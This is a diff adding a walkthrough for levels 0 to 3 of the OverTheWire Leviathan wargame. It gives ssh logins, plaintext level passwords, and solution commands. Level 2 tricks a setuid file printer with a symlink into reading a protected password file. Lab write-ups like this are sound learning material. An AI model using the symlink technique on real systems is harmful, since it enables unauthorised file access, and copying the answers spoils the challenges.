@@ -858,3 +858,99 @@ Solution:
 ```
 **Password: **
 
+# Leviathan
+## Level 0:
+CMD:
+```bash
+ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+```
+Passowrd:
+```bash
+leviathan0
+```
+Solution:
+```bash
+cd /etc/leviathan_pass
+ls
+ls -la ~
+cd ~/.backup
+ls -la ~/.backup
+cat ~/.backup/bookmarks.html
+grep -i "password" ~/.backup/bookmarks.html
+grep -i "leviathan1" ~/.backup/bookmarks.html
+```
+**Password: 3QJ3TgzHDq**
+
+## Level 1:
+CMD:
+```bash
+ssh leviathan1@leviathan.labs.overthewire.org -p 2223
+```
+Passowrd:
+```bash
+3QJ3TgzHDq
+```
+Solution:
+```bash
+ls -la ~
+./check
+```
+```bash
+a
+```
+```bash
+ltrace ./check
+```
+```bash
+a
+```
+```bash
+./check
+```
+```bash
+sex
+```
+```bash
+cat /etc/leviathan_pass/leviathan2
+```
+**Password: NsN1HwFoyN**
+
+## Level 2:
+CMD:
+```bash
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+```
+Passowrd:
+```bash
+NsN1HwFoyN
+```
+Solution:
+```bash
+ls -la
+./printfile
+./printfile /etc/leviathan_pass/leviathan3
+ltrace ./printfile
+mkdir /tmp/mydir8
+touch /tmp/mydir8/"test file.txt"
+ls -la /tmp/mydir8
+./printfile /tmp/mydir8/"test file.txt"
+ln -s /etc/leviathan_pass/leviathan3 /tmp/mydir8/test
+ls -la /tmp/mydir8
+./printfile /tmp/mydir8/"test file.txt"
+```
+**Password: f0n8h2iWLP**
+
+## Level 3:
+CMD:
+```bash
+ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+```
+Passowrd:
+```bash
+f0n8h2iWLP
+```
+Solution:
+```bash
+
+```
+**Password: **
